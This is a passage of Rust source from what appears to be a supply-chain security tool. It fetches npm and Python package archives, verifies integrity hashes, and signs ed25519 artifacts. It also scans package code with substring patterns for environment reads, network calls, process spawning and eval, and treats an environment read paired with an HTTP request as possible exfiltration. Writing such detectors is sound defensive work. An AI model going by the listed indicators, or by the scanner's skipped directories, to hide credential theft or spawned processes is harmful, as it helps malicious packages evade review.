        .unwrap_or(&package.source_url);
    let config = if package.ecosystem == Ecosystem::Npm {
        Some(read_npm_config(project_dir)?)
    } else {
        None
    };
    let request = if let Some(config) = config.as_ref() {
        npm_get(client, source_url, config)
    } else {
        client.get(source_url)
    };
    Ok(request.send()?.error_for_status()?.bytes()?.to_vec())
}

fn cache_archive(
    project_dir: &Path,
    package: &ResolvedPackage,
    sha256: &str,
    bytes: &[u8],
) -> Result<PathBuf> {
    let cache_dir = project_dir
        .join(".omc")
        .join("cache")
        .join(package.ecosystem.to_string())
        .join(safe_name(&package.name))
        .join(&package.version);
    fs::create_dir_all(&cache_dir)?;

    let extension = archive_extension(&package.filename);
    let archive_path = cache_dir.join(format!("{sha256}.{extension}"));
    if !archive_path.exists() {
        fs::write(&archive_path, bytes)?;
    }
    Ok(archive_path)
}

fn write_artifact(
    project_dir: &Path,
    package: &ResolvedPackage,
    artifact: &OmcArtifact,
) -> Result<PathBuf> {
    let artifact_dir = project_dir
        .join(".omc")
        .join("artifacts")
        .join(package.ecosystem.to_string())
        .join(safe_name(&package.name))
        .join(&package.version);
    fs::create_dir_all(&artifact_dir)?;

    let artifact_path = artifact_dir.join("omc.json");
    fs::write(&artifact_path, serde_json::to_string_pretty(artifact)?)?;
    Ok(artifact_path)
}

fn sign_artifact(project_dir: &Path, artifact: &mut OmcArtifact) -> Result<()> {
    artifact.signature = None;
    let payload = serde_json::to_vec(artifact)?;
    let signing_key = read_or_create_artifact_signing_key(project_dir)?;
    let verifying_key = signing_key.verifying_key();
    let signature = signing_key.sign(&payload);
    let public_key = verifying_key.to_bytes();

    artifact.signature = Some(ArtifactSignature {
        algorithm: "ed25519".to_owned(),
        key_id: sha256_hex(&public_key)[..16].to_owned(),
        public_key: STANDARD.encode(public_key),
        payload_sha256: sha256_hex(&payload),
        signature: STANDARD.encode(signature.to_bytes()),
    });
    Ok(())
}

pub fn verify_artifact_signature(artifact: &OmcArtifact) -> Result<()> {
    let signature = artifact.signature.as_ref().ok_or_else(|| {
        OmcRegistryError::UnsupportedInstallArtifact("artifact is unsigned".to_owned())
    })?;
    if signature.algorithm != "ed25519" {
        return Err(OmcRegistryError::UnsupportedInstallArtifact(format!(
            "unsupported artifact signature algorithm `{}`",
            signature.algorithm
        )));
    }

    let mut unsigned = artifact.clone();
    unsigned.signature = None;
    let payload = serde_json::to_vec(&unsigned)?;
    let actual_payload_sha256 = sha256_hex(&payload);
    if !signature
        .payload_sha256
        .eq_ignore_ascii_case(&actual_payload_sha256)
    {
        return Err(OmcRegistryError::DigestMismatch {
            name: artifact.package.name.clone(),
            expected: format!("sha256:{}", signature.payload_sha256),
            actual: format!("sha256:{actual_payload_sha256}"),
        });
    }

    let public_key = decode_base64_array::<32>(&signature.public_key, "artifact public key")?;
    let verifying_key = VerifyingKey::from_bytes(&public_key).map_err(|error| {
        OmcRegistryError::UnsupportedInstallArtifact(format!(
            "invalid artifact public key: {error}"
        ))
    })?;
    let signature_bytes = STANDARD.decode(&signature.signature).map_err(|error| {
        OmcRegistryError::UnsupportedInstallArtifact(format!(
            "invalid artifact signature encoding: {error}"
        ))
    })?;
    let signature = Signature::from_slice(&signature_bytes).map_err(|error| {
        OmcRegistryError::UnsupportedInstallArtifact(format!("invalid artifact signature: {error}"))
    })?;
    verifying_key.verify(&payload, &signature).map_err(|error| {
        OmcRegistryError::UnsupportedInstallArtifact(format!(
            "artifact signature verification failed: {error}"
        ))
    })
}

fn read_or_create_artifact_signing_key(project_dir: &Path) -> Result<SigningKey> {
    let key_path = artifact_signing_key_path(project_dir);
    if key_path.exists() {
        let encoded = fs::read_to_string(&key_path)?;
        let bytes = decode_base64_array::<32>(encoded.trim(), "artifact signing key")?;
        return Ok(SigningKey::from_bytes(&bytes));
    }

    if let Some(parent) = key_path.parent() {
        fs::create_dir_all(parent)?;
        restrict_private_key_dir(parent)?;
    }
    let signing_key = SigningKey::generate(&mut OsRng);
    fs::write(&key_path, STANDARD.encode(signing_key.to_bytes()))?;
    restrict_private_key_file(&key_path)?;
    Ok(signing_key)
}

fn artifact_signing_key_path(project_dir: &Path) -> PathBuf {
    project_dir
        .join(".omc")
        .join("keys")
        .join(ARTIFACT_SIGNING_KEY)
}

fn decode_base64_array<const N: usize>(encoded: &str, description: &str) -> Result<[u8; N]> {
    let bytes = STANDARD.decode(encoded).map_err(|error| {
        OmcRegistryError::UnsupportedInstallArtifact(format!("{description} is invalid: {error}"))
    })?;
    bytes.try_into().map_err(|bytes: Vec<u8>| {
        OmcRegistryError::UnsupportedInstallArtifact(format!(
            "{description} must be {N} bytes, got {}",
            bytes.len()
        ))
    })
}

#[cfg(unix)]
fn restrict_private_key_dir(path: &Path) -> Result<()> {
    use std::os::unix::fs::PermissionsExt;

    fs::set_permissions(path, fs::Permissions::from_mode(0o700))?;
    Ok(())
}

#[cfg(not(unix))]
fn restrict_private_key_dir(_path: &Path) -> Result<()> {
    Ok(())
}

#[cfg(unix)]
fn restrict_private_key_file(path: &Path) -> Result<()> {
    use std::os::unix::fs::PermissionsExt;

    fs::set_permissions(path, fs::Permissions::from_mode(0o600))?;
    Ok(())
}

#[cfg(not(unix))]
fn restrict_private_key_file(_path: &Path) -> Result<()> {
    Ok(())
}

#[derive(Debug, Clone)]
struct ArchiveProfile {
    files_scanned: usize,
    capabilities: Vec<CapabilityFinding>,
}

fn profile_archive(package: &ResolvedPackage, bytes: &[u8]) -> Result<ArchiveProfile> {
    let mut profiler = SourceProfiler::default();

    for (name, script) in &package.npm_scripts {
        if is_npm_lifecycle_script(name) {
            profiler.add(
                CapabilityKind::ProcSpawn,
                format!("npm-script:{name}"),
                "package.json",
                format!("lifecycle script `{name}` = `{script}`"),
            );
        }
    }

    if package.filename.ends_with(".tgz") || package.filename.ends_with(".tar.gz") {
        let decoder = GzDecoder::new(Cursor::new(bytes));
        let mut archive = Archive::new(decoder);
        for entry in archive.entries()? {
            let mut entry = entry?;
            if !entry.header().entry_type().is_file() || entry.size() > MAX_FILE_BYTES {
                continue;
            }
            let path = entry.path()?.to_string_lossy().into_owned();
            let mut content = String::new();
            entry.read_to_string(&mut content).ok();
            profiler.scan_file(&path, &content);
        }
    } else if package.filename.ends_with(".whl") || package.filename.ends_with(".zip") {
        let reader = Cursor::new(bytes);
        let mut archive = zip::ZipArchive::new(reader)?;
        for index in 0..archive.len() {
            let mut file = archive.by_index(index)?;
            if file.is_dir() || file.size() > MAX_FILE_BYTES {
                continue;
            }
            let path = file.name().to_owned();
            let mut content = String::new();
            file.read_to_string(&mut content).ok();
            profiler.scan_file(&path, &content);
        }
    } else {
        let content = String::from_utf8_lossy(bytes);
        profiler.scan_file(&package.filename, &content);
    }

    Ok(profiler.finish())
}

#[derive(Debug, Default)]
struct SourceProfiler {
    files_scanned: usize,
    findings: BTreeSet<CapabilityFinding>,
}

impl SourceProfiler {
    fn scan_file(&mut self, path: &str, content: &str) {
        if !is_source_like(path) || is_ignored_source_path(path) || content.is_empty() {
            return;
        }

        self.files_scanned += 1;
        let lower = content.to_ascii_lowercase();

        let env_targets = extract_env_read_targets(content);
        if env_targets.is_empty() {
            for pattern in ["process.env", "os.environ", "getenv("] {
                if lower.contains(pattern) {
                    self.add(CapabilityKind::EnvRead, "*", path, pattern);
                }
            }
        } else {
            for name in env_targets {
                self.add(
                    CapabilityKind::EnvRead,
                    name.clone(),
                    path,
                    format!("static env read `{name}`"),
                );
            }
        }

        for pattern in [
            "readfilesync",
            "readfile(",
            "createreadstream",
            "require(\"fs\")",
            "require('fs')",
            "open(",
        ] {
            if lower.contains(pattern) {
                self.add(CapabilityKind::FsRead, "*", path, pattern);
            }
        }

        for pattern in [
            "writefilesync",
            "writefile(",
            "createwritestream",
            ".write(",
        ] {
            if lower.contains(pattern) {
                self.add(CapabilityKind::FsWrite, "*", path, pattern);
            }
        }

        let http_hosts = extract_http_hosts(content);
        if http_hosts.is_empty() {
            for pattern in [
                "fetch(",
                "require(\"http\")",
                "require('http')",
                "require(\"https\")",
                "require('https')",
                "axios",
                "requests.",
                "urllib.request",
                "httpx.",
                "socket.",
            ] {
                if lower.contains(pattern) {
                    self.add(CapabilityKind::HttpRequest, "*", path, pattern);
                }
            }
        } else {
            for host in http_hosts {
                self.add(
                    CapabilityKind::HttpRequest,
                    host.clone(),
                    path,
                    format!("static URL host `{host}`"),
                );
            }
        }

        for pattern in [
            "child_process",
            "subprocess",
            "os.system",
            "popen(",
            "spawn(",
            "execfile(",
        ] {
            if lower.contains(pattern) {
                self.add(CapabilityKind::ProcSpawn, "*", path, pattern);
            }
        }

        for pattern in ["eval(", "new function", "exec("] {
            if lower.contains(pattern) {
                self.add(CapabilityKind::DynamicEval, "*", path, pattern);
            }
        }
    }

    fn add(
        &mut self,
        kind: CapabilityKind,
        target: impl Into<String>,
        source: impl Into<String>,
        evidence: impl Into<String>,
    ) {
        self.findings.insert(CapabilityFinding {
            kind,
            target: target.into(),
            source: source.into(),
            evidence: evidence.into(),
        });
    }

    fn finish(self) -> ArchiveProfile {
        ArchiveProfile {
            files_scanned: self.files_scanned,
            capabilities: self.findings.into_iter().collect(),
        }
    }
}

fn extract_env_read_targets(content: &str) -> BTreeSet<String> {
    let mut targets = BTreeSet::new();
    collect_process_env_dot_targets(content, &mut targets);
    for marker in ["process.env[", "os.environ[", "os.getenv(", "getenv("] {
        collect_quoted_argument_targets(content, marker, &mut targets);
    }
    targets
}

fn collect_process_env_dot_targets(content: &str, targets: &mut BTreeSet<String>) {
    let marker = "process.env.";
    let mut offset = 0;
    while let Some(index) = content[offset..].find(marker) {
        let start = offset + index + marker.len();
        let name = content[start..]
            .chars()
            .take_while(|ch| ch.is_ascii_alphanumeric() || *ch == '_')
            .collect::<String>();
        if !name.is_empty() {
            targets.insert(name);
        }
        offset = start.saturating_add(1);
    }
}

fn collect_quoted_argument_targets(content: &str, marker: &str, targets: &mut BTreeSet<String>) {
    let mut offset = 0;
    while let Some(index) = content[offset..].find(marker) {
        let start = offset + index + marker.len();
        if let Some((target, consumed)) = parse_quoted_literal(content[start..].trim_start()) {
            if !target.is_empty()
                && target
                    .chars()
                    .all(|ch| ch.is_ascii_alphanumeric() || ch == '_')
            {
                targets.insert(target);
            }
            offset = start + consumed;
        } else {
            offset = start.saturating_add(1);
        }
    }
}

fn extract_http_hosts(content: &str) -> BTreeSet<String> {
    quoted_string_literals(content)
        .into_iter()
        .filter(|literal| literal.starts_with("http://") || literal.starts_with("https://"))
        .filter_map(|literal| {
            reqwest::Url::parse(&literal)
                .ok()
                .and_then(|url| url.host_str().map(str::to_owned))
        })
        .collect()
}

fn quoted_string_literals(content: &str) -> Vec<String> {
    let mut literals = Vec::new();
    let bytes = content.as_bytes();
    let mut index = 0;
    while index < bytes.len() {
        if matches!(bytes[index], b'\'' | b'"' | b'`') {
            if let Some((literal, consumed)) = parse_quoted_literal(&content[index..]) {
                literals.push(literal);
                index += consumed;
                continue;
            }
        }
        index += 1;
    }
    literals
}

fn parse_quoted_literal(content: &str) -> Option<(String, usize)> {
    let bytes = content.as_bytes();
    let quote = *bytes.first()?;
    if !matches!(quote, b'\'' | b'"' | b'`') {
        return None;
    }

    let mut literal = Vec::new();
    let mut escaped = false;
    for (index, byte) in bytes.iter().enumerate().skip(1) {
        if escaped {
            literal.push(*byte);
            escaped = false;
            continue;
        }
        if *byte == b'\\' {
            escaped = true;
            continue;
        }
        if *byte == quote {
            return String::from_utf8(literal)
                .ok()
                .map(|literal| (literal, index + 1));
        }
        literal.push(*byte);
    }
    None
}

fn module_from_profile(package: &ResolvedPackage, capabilities: &[CapabilityFinding]) -> Module {
    let behavior = if capabilities.is_empty() {
        BehaviorType::Pure
    } else {
        BehaviorType::HostCapability
    };
    let mut code = Vec::new();
    let env_findings = capabilities
        .iter()
        .filter(|finding| finding.kind == CapabilityKind::EnvRead)
        .collect::<Vec<_>>();
    let http_findings = capabilities
        .iter()
        .filter(|finding| finding.kind == CapabilityKind::HttpRequest)
        .collect::<Vec<_>>();

    if env_findings.is_empty() || http_findings.is_empty() {
        for finding in capabilities {
            code.push(Op::Cap(cap_op_from_finding(finding)));
        }
    } else {
        for env in &env_findings {
            for http in &http_findings {
                code.push(Op::Cap(cap_op_from_finding(env)));
                let mut cap = cap_op_from_finding(http);
                if let CapOp::HttpRequest { request } = &mut cap {
                    request.body_from_stack = true;
                }
                code.push(Op::Cap(cap));
            }
        }
        for finding in capabilities.iter().filter(|finding| {
            !matches!(
                finding.kind,
                CapabilityKind::EnvRead | CapabilityKind::HttpRequest
            )
        }) {
            code.push(Op::Cap(cap_op_from_finding(finding)));
        }
    }
    code.push(Op::Const(Value::Unit));
    code.push(Op::Return);

    Module {
        id: format!("{}:{}@{}", package.ecosystem, package.name, package.version),
        package: package.name.clone(),
        version: package.version.clone(),
        declared_behavior: behavior,
        functions: vec![Function::new(0, "package_init", 0, code)],
    }
}

fn cap_op_from_finding(finding: &CapabilityFinding) -> CapOp {
    match finding.kind {
        CapabilityKind::EnvRead => CapOp::EnvRead {
            name: finding.target.clone(),
        },
        CapabilityKind::FsRead => CapOp::FsRead {
            path: VirtualPath(finding.target.clone()),
        },
        CapabilityKind::FsWrite => CapOp::FsWrite {
            path: VirtualPath(finding.target.clone()),
            value_from_stack: false,
        },
        CapabilityKind::HttpRequest => CapOp::HttpRequest {
            request: HttpRequest {
                method: "POST".to_owned(),
                url: "omc://observed-network".to_owned(),
                host: finding.target.clone(),
                body_from_stack: false,
            },
        },
        CapabilityKind::ProcSpawn => CapOp::ProcSpawn {
            command: finding.target.clone(),
            args: Vec::new(),
        },
        CapabilityKind::DynamicEval => CapOp::DynamicEval {
            source_from_stack: false,
        },
    }
}

fn render_verify_finding(finding: VerifyFinding) -> String {
    format!(
        "{}[{}]: {}",
        finding.function, finding.instruction, finding.message
    )
}

fn is_npm_lifecycle_script(name: &str) -> bool {
    matches!(
        name,
        "preinstall"
            | "install"
            | "postinstall"
            | "prepare"
            | "prepublish"
            | "prepack"
            | "postpack"
    )
}

fn is_source_like(path: &str) -> bool {
    let path = path.to_ascii_lowercase();
    let file_name = Path::new(&path)
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or_default();

    if matches!(
        file_name,
        "package.json"
            | "package-lock.json"
            | "npm-shrinkwrap.json"
            | "pnpm-lock.yaml"
            | "yarn.lock"
            | "Pipfile.lock"
            | "uv.lock"
            | "pylock.toml"
            | "pylock.omc.toml"
            | "setup.py"
            | "conftest.py"
            | "tox.ini"
            | "noxfile.py"
            | "pyproject.toml"
            | "setup.cfg"
    ) {
        return false;
    }

    matches!(
        Path::new(&path).extension().and_then(|ext| ext.to_str()),
        Some("js" | "mjs" | "cjs" | "ts" | "tsx" | "jsx" | "py" | "json" | "toml" | "cfg" | "ini")
    )
}

fn is_ignored_source_path(path: &str) -> bool {
    path.split('/').any(|component| {
        matches!(
            component.to_ascii_lowercase().as_str(),
            "test"
                | "tests"
                | "__tests__"
                | "docs"
                | "doc"
                | "examples"
                | "example"
                | "benchmark"
                | "benchmarks"
                | "perf"
                | "performance"
        )
    })
}

fn sha256_hex(bytes: &[u8]) -> String {
    let mut digest = Sha256::new();
    digest.update(bytes);
    hex::encode(digest.finalize())
}

fn sha1_hex(bytes: &[u8]) -> String {
    let mut digest = Sha1::new();
    digest.update(bytes);
    hex::encode(digest.finalize())
}

fn verify_npm_integrity(name: &str, integrity: &str, bytes: &[u8]) -> Result<()> {
    let mut saw_supported = false;
    for token in integrity.split_whitespace() {
        let Some((algorithm, expected_b64)) = token.split_once('-') else {
            return Err(OmcRegistryError::UnsupportedSpec(format!(
                "malformed npm integrity for {name}"
            )));
        };
        let expected_b64 = expected_b64.split('?').next().unwrap_or(expected_b64);
        let expected = STANDARD.decode(expected_b64).map_err(|_| {
            OmcRegistryError::UnsupportedSpec(format!("malformed npm integrity for {name}"))
        })?;
        let Some(actual) = npm_integrity_digest(algorithm, bytes) else {
            continue;
        };
        saw_supported = true;
        if expected != actual {
            return Err(OmcRegistryError::DigestMismatch {
                name: name.to_owned(),
                expected: format!("{algorithm}-{expected_b64}"),
                actual: format!("{algorithm}-{}", STANDARD.encode(actual)),
            });
        }
    }

    if !saw_supported {
        return Err(OmcRegistryError::UnsupportedSpec(format!(
            "unsupported npm integrity digest for {name}"
        )));
    }

    Ok(())
}

fn npm_integrity_digest(algorithm: &str, bytes: &[u8]) -> Option<Vec<u8>> {
    match algorithm {
        "sha1" => {
            let mut digest = Sha1::new();
            digest.update(bytes);
            Some(digest.finalize().to_vec())
        }
        "sha256" => {
            let mut digest = Sha256::new();
            digest.update(bytes);
            Some(digest.finalize().to_vec())
        }
        "sha512" => {
            let mut digest = Sha512::new();
            digest.update(bytes);
            Some(digest.finalize().to_vec())
        }
        _ => None,
    }
}

fn archive_extension(filename: &str) -> &'static str {
    if filename.ends_with(".tar.gz") || filename.ends_with(".tgz") {
        "tgz"
    } else if filename.ends_with(".whl") {
        "whl"
    } else if filename.ends_with(".zip") {
        "zip"
    } else {
        "archive"
    }
}

fn safe_name(name: &str) -> String {
    name.replace('/', "__")
}

fn relative_path(base: &Path, path: &Path) -> String {
    path.strip_prefix(base)
        .unwrap_or(path)
        .to_string_lossy()
        .replace('\\', "/")
}

#[derive(Debug, Deserialize)]
struct ProjectPackageJson {
    #[serde(default)]
    name: Option<String>,
    #[serde(default)]
    scripts: BTreeMap<String, String>,
    #[serde(default)]
    workspaces: Option<ProjectWorkspaces>,
    #[serde(default)]
    dependencies: BTreeMap<String, String>,
    #[serde(default, rename = "devDependencies")]
    dev_dependencies: BTreeMap<String, String>,
    #[serde(default, rename = "optionalDependencies")]
    optional_dependencies: BTreeMap<String, String>,
    #[serde(default, rename = "peerDependencies")]
    peer_dependencies: BTreeMap<String, String>,
    #[serde(default, rename = "peerDependenciesMeta")]
    peer_dependencies_meta: BTreeMap<String, NpmPeerDependencyMeta>,
    #[serde(default)]
    overrides: BTreeMap<String, serde_json::Value>,
    #[serde(default)]
    resolutions: BTreeMap<String, serde_json::Value>,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(untagged)]
enum ProjectWorkspaces {
    Patterns(Vec<String>),
    Config {
        #[serde(default)]
        packages: Vec<String>,
    },
}

impl ProjectWorkspaces {
    fn patterns(&self) -> &[String] {
        match self {
            Self::Patterns(patterns) => patterns,
            Self::Config { packages } => packages,
        }
    }
}

#[derive(Debug, Default, Deserialize)]
struct NpmPackageLock {
    #[serde(default)]
    packages: BTreeMap<String, NpmPackageLockPackage>,
    #[serde(default)]
    dependencies: BTreeMap<String, NpmPackageLockDependency>,
}

#[derive(Debug, Deserialize)]
struct NpmPackageLockPackage {
    version: Option<String>,
    #[serde(default)]
    integrity: Option<String>,
    #[serde(default)]
    resolved: Option<String>,
}

#[derive(Debug, Default, Deserialize)]
struct NpmPackageLockDependency {
    version: Option<String>,
    #[serde(default)]
    integrity: Option<String>,
    #[serde(default)]
    resolved: Option<String>,
    #[serde(default)]
    dependencies: BTreeMap<String, NpmPackageLockDependency>,
}

#[derive(Debug)]
struct YarnLockEntry {
    selectors: Vec<String>,
    version: Option<String>,
    resolved: Option<String>,
    integrity: Option<String>,
}

#[derive(Debug, Default, Deserialize)]
struct PnpmLock {
    #[serde(default)]
    importers: BTreeMap<String, PnpmImporter>,
    #[serde(default)]
    packages: BTreeMap<String, PnpmPackageSnapshot>,
}

#[derive(Debug, Default, Deserialize)]
struct PnpmImporter {
    #[serde(default)]
    dependencies: BTreeMap<String, PnpmImporterDependency>,
    #[serde(default, rename = "devDependencies")]
    dev_dependencies: BTreeMap<String, PnpmImporterDependency>,
    #[serde(default, rename = "optionalDependencies")]
    optional_dependencies: BTreeMap<String, PnpmImporterDependency>,
}

#[derive(Debug, Deserialize)]
#[serde(untagged)]
enum PnpmImporterDependency {
    Version(String),
    Detail { version: Option<String> },
}

impl PnpmImporterDependency {
    fn locked_version(&self) -> Option<&str> {
        match self {
            Self::Version(version) => Some(version),
            Self::Detail { version } => version.as_deref(),
        }
    }
}

#[derive(Debug, Default, Deserialize)]
struct PnpmPackageSnapshot {
    resolution: Option<PnpmResolution>,
}

#[derive(Debug, Default, Deserialize)]
struct PnpmResolution {
    integrity: Option<String>,
    tarball: Option<String>,
}

#[derive(Debug, Deserialize)]
struct PyProjectToml {
    project: Option<PyProjectProject>,
    #[serde(default, rename = "dependency-groups")]
    dependency_groups: BTreeMap<String, Vec<PyProjectDependencyGroupItem>>,
    tool: Option<PyProjectTool>,
}

#[derive(Debug, Deserialize)]
struct PyProjectProject {
    name: Option<String>,
    #[serde(default)]
    dependencies: Vec<String>,
    #[serde(default, rename = "optional-dependencies")]
    optional_dependencies: BTreeMap<String, Vec<String>>,
    #[serde(default)]
    scripts: BTreeMap<String, String>,
    #[serde(default, rename = "gui-scripts")]
    gui_scripts: BTreeMap<String, String>,
}

#[derive(Debug, Deserialize)]
#[serde(untagged)]
enum PyProjectDependencyGroupItem {
    Requirement(String),
    Include {
        #[serde(rename = "include-group")]
        include_group: String,
    },
}

#[derive(Debug, Deserialize)]
struct PyProjectTool {
    poetry: Option<PoetryProject>,
    uv: Option<UvProject>,
}

#[derive(Debug, Default, Deserialize)]
struct UvProject {
    #[serde(default)]
    sources: BTreeMap<String, UvProjectSource>,
    workspace: Option<UvWorkspace>,
}

#[derive(Debug, Default, Deserialize)]
struct UvProjectSource {
    path: Option<String>,
    #[serde(default)]
    workspace: bool,
}

#[derive(Debug, Default, Deserialize)]
struct UvWorkspace {
    #[serde(default)]
    members: Vec<String>,
    #[serde(default)]
    exclude: Vec<String>,
}

#[derive(Debug, Default, Deserialize)]
struct PoetryProject {
    name: Option<String>,
    #[serde(default)]
    dependencies: BTreeMap<String, PoetryDependency>,
    #[serde(default, rename = "dev-dependencies")]
    dev_dependencies: BTreeMap<String, PoetryDependency>,
    #[serde(default)]
    extras: BTreeMap<String, Vec<String>>,
    #[serde(default)]
    scripts: BTreeMap<String, PoetryScript>,
    #[serde(default)]
    source: Vec<PoetrySource>,
    #[serde(default)]
    group: BTreeMap<String, PoetryGroup>,
}

#[derive(Debug, Default, Deserialize)]
struct PoetrySource {
    url: Option<String>,
}

#[derive(Debug, Deserialize)]
#[serde(untagged)]
enum PoetryScript {
    Target(String),
    Table { callable: Option<String> },
}

#[derive(Debug, Default, Deserialize)]
struct PoetryGroup {
    #[serde(default)]
    optional: bool,
    #[serde(default)]
    dependencies: BTreeMap<String, PoetryDependency>,
}

#[derive(Debug, Deserialize)]
#[serde(untagged)]
enum PoetryDependency {
    Version(String),
    Table(Box<PoetryDependencyTable>),
}

#[derive(Debug, Default, Deserialize)]
struct PoetryDependencyTable {
    version: Option<String>,
    #[serde(default)]
    optional: bool,
    path: Option<String>,
    git: Option<String>,
    #[serde(rename = "ref")]
    reference: Option<String>,
    rev: Option<String>,
    branch: Option<String>,
    tag: Option<String>,
    subdirectory: Option<String>,
    url: Option<String>,
    file: Option<String>,
    #[serde(default)]
    extras: Vec<String>,
}

#[derive(Debug, Default, Deserialize)]
struct PoetryLock {
    #[serde(default)]
    package: Vec<PoetryLockedPackage>,
    #[serde(default)]
    metadata: PoetryLockMetadata,
}

#[derive(Debug, Default, Deserialize)]
struct PoetryLockMetadata {
    #[serde(default)]
    files: BTreeMap<String, Vec<PoetryLockedFile>>,
}

#[derive(Debug, Deserialize)]
struct PoetryLockedPackage {
    name: String,
    version: String,
    #[serde(default)]
    files: Vec<PoetryLockedFile>,
}

#[derive(Debug, Deserialize)]
struct PoetryLockedFile {
    #[serde(rename = "file")]
    _file: String,
    hash: String,
}

#[derive(Debug, Deserialize)]
struct NpmInstalledPackageJson {
    name: Option<String>,
    bin: Option<NpmBinField>,
}

#[derive(Debug, Deserialize)]
#[serde(untagged)]
enum NpmBinField {
    String(String),
    Map(BTreeMap<String, String>),
}

#[derive(Debug, Default, Deserialize)]
struct Pipfile {
    #[serde(default)]
    source: Vec<PipfileSource>,
    #[serde(default)]
    packages: BTreeMap<String, PipfilePackage>,
    #[serde(default, rename = "dev-packages")]
    dev_packages: BTreeMap<String, PipfilePackage>,
}

#[derive(Debug, Default, Deserialize)]
struct PipfileScripts {
    #[serde(default)]
    scripts: BTreeMap<String, String>,
}

#[derive(Debug, Deserialize)]
#[serde(untagged)]
enum PipfilePackage {
    Version(String),
    Table(Box<PipfilePackageTable>),
}

#[derive(Debug, Default, Deserialize)]
struct PipfilePackageTable {
    version: Option<String>,
    path: Option<String>,
    file: Option<String>,
    git: Option<String>,
    #[serde(rename = "ref")]
    reference: Option<String>,
    rev: Option<String>,
    branch: Option<String>,
    tag: Option<String>,
    subdirectory: Option<String>,
    markers: Option<String>,
    #[serde(default)]
    extras: Vec<String>,
}

#[derive(Debug, Default, Deserialize)]
struct PipfileLock {
    #[serde(default, rename = "_meta")]
    metadata: PipfileLockMetadata,
    #[serde(default)]
    default: BTreeMap<String, PipfileLockedPackage>,
    #[serde(default)]
    develop: BTreeMap<String, PipfileLockedPackage>,
}

#[derive(Debug, Default, Deserialize)]
struct PipfileLockMetadata {
    #[serde(default)]
    sources: Vec<PipfileSource>,
}

#[derive(Debug, Default, Deserialize)]
struct PipfileSource {
    url: Option<String>,
}

#[derive(Debug, Default, Deserialize)]
struct PipfileLockedPackage {
    version: Option<String>,
    path: Option<String>,
    git: Option<String>,
    #[serde(rename = "ref")]
    reference: Option<String>,
    rev: Option<String>,
    branch: Option<String>,
    tag: Option<String>,
    subdirectory: Option<String>,
    #[serde(default)]
    hashes: Vec<String>,
    #[serde(default)]
    extras: Vec<String>,
    markers: Option<String>,
}

#[derive(Debug, Default, Deserialize)]
struct UvLock {
    #[serde(default)]
    package: Vec<UvLockedPackage>,
}

#[derive(Debug, Default, Deserialize)]
struct UvLockedPackage {
    name: String,
    version: String,
    source: Option<UvPackageSource>,
    sdist: Option<UvDistribution>,
    #[serde(default)]
    wheels: Vec<UvDistribution>,
    metadata: Option<UvPackageMetadata>,
}

#[derive(Debug, Default, Deserialize)]
struct UvPackageSource {
    registry: Option<String>,
    editable: Option<String>,
    directory: Option<String>,
    path: Option<String>,
}

#[derive(Debug, Default, Deserialize)]
struct UvDistribution {
    hash: Option<String>,
}

#[derive(Debug, Default, Deserialize)]
struct UvPackageMetadata {
    #[serde(default, rename = "requires-dist")]
    requires_dist: Vec<UvRequirement>,
    #[serde(default, rename = "requires-dev")]
    requires_dev: BTreeMap<String, Vec<UvRequirement>>,
}

#[derive(Debug, Default, Deserialize)]
struct UvRequirement {
    name: String,
    specifier: Option<String>,
    marker: Option<String>,
    editable: Option<String>,
    directory: Option<String>,
    path: Option<String>,
    #[serde(default)]
    extras: Vec<String>,
    #[serde(default)]
    extra: Vec<String>,
}

#[derive(Debug, Default, Deserialize)]
struct PylockToml {
    #[serde(default)]
    packages: Vec<PylockPackage>,
}

#[derive(Debug, Default, Deserialize)]
struct PylockPackage {
    name: String,
    version: String,
    marker: Option<String>,
    archive: Option<PylockDistribution>,
    sdist: Option<PylockDistribution>,
    #[serde(default)]
    wheels: Vec<PylockDistribution>,
}

#[derive(Debug, Default, Deserialize)]
struct PylockDistribution {
    #[serde(default)]
    hashes: BTreeMap<String, String>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct PythonEntryPoint {
    name: String,
    module: String,
    function: String,
}

#[derive(Debug, Deserialize)]
struct NpmRoot {
    #[serde(rename = "dist-tags")]
    dist_tags: NpmDistTags,
    versions: BTreeMap<String, NpmVersion>,
}

#[derive(Debug, Deserialize)]
struct NpmDistTags {
    latest: String,
}

#[derive(Debug, Deserialize)]
struct NpmVersion {
    version: String,
    dist: NpmDist,
    #[serde(default)]
    os: Option<NpmStringList>,
    #[serde(default)]
    cpu: Option<NpmStringList>,
    #[serde(default)]
    libc: Option<NpmStringList>,
    #[serde(default)]
    scripts: Option<BTreeMap<String, String>>,
    #[serde(default)]
    dependencies: Option<BTreeMap<String, String>>,
    #[serde(default, rename = "optionalDependencies")]
    optional_dependencies: Option<BTreeMap<String, String>>,
    #[serde(default, rename = "bundleDependencies")]
    bundle_dependencies: Option<NpmStringList>,
    #[serde(default, rename = "bundledDependencies")]
    bundled_dependencies: Option<NpmStringList>,
    #[serde(default, rename = "peerDependencies")]
    peer_dependencies: Option<BTreeMap<String, String>>,
    #[serde(default, rename = "peerDependenciesMeta")]
    peer_dependencies_meta: Option<BTreeMap<String, NpmPeerDependencyMeta>>,
}

#[derive(Debug, Deserialize)]
struct NpmPackageManifest {
    #[serde(default)]
    name: Option<String>,
    version: String,
    #[serde(default)]
    os: Option<NpmStringList>,
    #[serde(default)]
    cpu: Option<NpmStringList>,
    #[serde(default)]
    libc: Option<NpmStringList>,
    #[serde(default)]
    scripts: Option<BTreeMap<String, String>>,
    #[serde(default)]
    dependencies: Option<BTreeMap<String, String>>,
    #[serde(default, rename = "optionalDependencies")]
    optional_dependencies: Option<BTreeMap<String, String>>,
    #[serde(default, rename = "bundleDependencies")]
    bundle_dependencies: Option<NpmStringList>,
    #[serde(default, rename = "bundledDependencies")]
    bundled_dependencies: Option<NpmStringList>,
    #[serde(default, rename = "peerDependencies")]
    peer_dependencies: Option<BTreeMap<String, String>>,
    #[serde(default, rename = "peerDependenciesMeta")]
    peer_dependencies_meta: Option<BTreeMap<String, NpmPeerDependencyMeta>>,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(untagged)]
enum NpmStringList {
    One(String),
    Many(Vec<String>),
    Bool(bool),
}

impl NpmStringList {
    fn values(&self) -> Vec<String> {
        match self {
            Self::One(value) => vec![value.clone()],
            Self::Many(values) => values.clone(),
            Self::Bool(_) => Vec::new(),
        }
    }

    fn bool_value(&self) -> Option<bool> {
        match self {
            Self::Bool(value) => Some(*value),
            _ => None,
        }
    }
}

